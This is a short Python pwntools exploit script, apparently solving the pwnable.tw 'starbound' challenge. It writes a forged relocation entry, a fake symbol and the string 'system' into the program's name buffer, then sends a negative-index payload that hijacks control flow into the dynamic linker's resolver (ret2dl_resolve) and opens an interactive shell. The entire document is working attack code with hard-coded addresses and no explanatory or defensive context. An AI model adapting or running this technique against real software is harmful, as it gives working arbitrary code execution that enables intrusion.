from pwn import *
import pdb

# p = remote('chall.pwnable.tw', 10200)
p = process('/home/len/pwnable/starbound')


def set_name(name):
    p.sendlineafter('> ', '6')
    p.sendlineafter('> ', '2')
    p.sendlineafter('Enter your name: ', name)
    p.sendlineafter('> ', '1')


def trigger(payload):
    p.sendlineafter('> ', payload)


STRTAB_ADDR = 0x80484fc
SYMTAB_ADDR = 0x80481dc
REL_PLT_ADDR = 0x80487d0
NAME_ADDR = 0x80580D0

elf = ELF('/home/len/pwnable/starbound')
puts_plt_addr = elf.symbols['puts']
ret_dl_resolve = 0x804895B

gadget = 0x8048e48
read_plt_addr = 0x8055054

fake_rel_addr = NAME_ADDR + 0x8
fake_rel_offset = fake_rel_addr - REL_PLT_ADDR

fake_symbol_addr = fake_rel_addr + 0x8
fake_symbol_index = (fake_symbol_addr - SYMTAB_ADDR) / 0x10

fake_str_addr = fake_symbol_addr + 0x10
fake_str_offset = fake_str_addr - STRTAB_ADDR  # system

fake_rel_info = fake_symbol_index << 8 | 7
fake_rel = p32(read_plt_addr) + p32(fake_rel_info)
fake_symbol = p32(fake_str_offset) + p32(0) * 2 + p32(0X12)
fake_str = 'system\x00'

context.log_level = 'info'

if __name__ == "__main__":
    set_name(p32(gadget) + p32(0) + fake_rel + fake_symbol + fake_str)

    log.info("fake_rel_addr: {:#x}".format(fake_rel_addr))
    log.info("fake_symbol_addr: {:#x}".format(fake_symbol_addr))
    log.info("fake_str_addr: {:#x}".format(fake_str_addr))

    pdb.set_trace()
    payload = str(-33) + '\x00' + 'a' * 4 + p32(ret_dl_resolve) + p32(
        fake_rel_offset)
    trigger(payload)
    p.interactive()
